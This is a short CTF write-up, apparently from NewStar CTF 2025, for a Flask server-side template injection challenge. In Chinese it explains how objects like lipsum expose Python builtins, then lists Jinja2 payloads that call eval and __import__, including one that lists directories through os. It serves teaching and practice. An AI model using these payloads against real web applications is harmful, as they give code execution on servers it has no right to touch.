---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# who'ssti

本题考验 SSTI 基本功，由于没设置过滤，搜索用例通过 eval 调用就行。

这里由于是 flask 环境，可以利用 config 或 lipsum 等环境内的自带模块取得全局对象。

<Container type='info'>

Lipsum 是一个用于生成随机化 [Lorem Ipsum 文本](https://cn.lipsum.com/)的 Python 模块
</Container>

```py
{{lipsum.__globals__.__builtins__.eval("__import__('re').findall('1', '12')")}}
{{lipsum.__globals__.__builtins__.eval("__import__('difflib').get_close_matches('ciallo',['hello','ciao'])")}}
{{lipsum.__globals__.__builtins__.eval("__import__('random').randint(0,10)")}}
{{lipsum.__globals__.__builtins__.eval("__import__('textwrap').dedent('ciallo')")}}
{{lipsum.__globals__.__builtins__.__import__('statistics').mean([1,2])}}
{{lipsum.__globals__.__builtins__.__import__('statistics').fmean([1,2])}}
{{lipsum.__globals__.__builtins__.__import__('random').choice([1, 2])}}
{{lipsum.__globals__.__builtins__.__import__('os').listdir('.')}}
{{lipsum.__globals__.__builtins__.__import__('json').loads('{"a":1}')}}
{{lipsum.__globals__.__builtins__.__import__('numpy').sum([1, 2])}}
```
